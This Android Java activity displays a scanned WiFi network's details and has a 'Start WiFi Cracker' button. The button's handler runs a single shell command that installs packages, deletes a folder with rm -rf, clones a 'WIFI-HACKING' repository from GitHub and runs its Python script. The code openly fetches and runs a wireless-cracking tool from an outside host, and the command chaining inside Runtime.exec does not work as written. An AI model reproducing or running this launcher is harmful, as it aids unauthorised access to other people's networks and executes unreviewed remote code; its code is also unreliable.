package com.example.mobilesentinel;

import com.example.mobilesentinel.R;
import android.os.Bundle;
import android.util.Log;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

public class WifiDetailsActivity extends AppCompatActivity {

    private TextView wifiNameTextView;
    private TextView securityTypeTextView;
    private TextView networkModeTextView;
    private Button startWifiCrackerButton;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_wifi_details);

        wifiNameTextView = findViewById(R.id.wifiName);
        securityTypeTextView = findViewById(R.id.securityType);
        networkModeTextView = findViewById(R.id.networkMode);
        startWifiCrackerButton = findViewById(R.id.startWifiCrackerButton);

        // Get WiFi data passed from NetworkScannerActivity
        String wifiName = getIntent().getStringExtra("WIFI_NAME");
        String capabilities = getIntent().getStringExtra("CAPABILITIES");

        // Set WiFi name with a fallback if null or empty
        if (wifiName != null && !wifiName.isEmpty()) {
            wifiNameTextView.setText(wifiName);
        } else {
            wifiNameTextView.setText("WiFi Name Unavailable");
        }

        // Format and set security type and network mode
        formatAndDisplayWiFiDetails(capabilities);

        // Set up the "Start WiFi Cracker" button
        startWifiCrackerButton.setOnClickListener(view -> startWiFiCrackingProcess());
    }

    private void formatAndDisplayWiFiDetails(String capabilities) {
        if (capabilities != null) {
            // Interpret capabilities into user-friendly terms
            if (capabilities.contains("WPA2")) {
                securityTypeTextView.setText("WPA2 (Secure)");
            } else if (capabilities.contains("WPA")) {
                securityTypeTextView.setText("WPA (Secure)");
            } else if (capabilities.contains("WEP")) {
                securityTypeTextView.setText("WEP (Less Secure)");
            } else {
                securityTypeTextView.setText("Open Network (No Security)");
            }

            // Display network mode (e.g., ESS or other modes)
            if (capabilities.contains("ESS")) {
                networkModeTextView.setText("ESS (Extended Service Set)");
            } else {
                networkModeTextView.setText("Other Network Mode");
            }
        }
    }

    private void startWiFiCrackingProcess() {
        try {
            // Original cracking command
            Runtime.getRuntime().exec("apt update && apt install git && apt install python && apt install python3 && rm -rf WIFI-HACKING && git clone --depth=1 https://github.com/U7P4L-IN/WIFI-HACKING.git && cd WIFI-HACKING && python WIFI.py");
            Toast.makeText(this, "WiFi Cracking Process Started", Toast.LENGTH_SHORT).show();
        } catch (Exception e) {
            Log.e("WiFiCracker", "Error starting WiFi cracking", e);
            Toast.makeText(this, "Failed to start WiFi Cracking: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }
}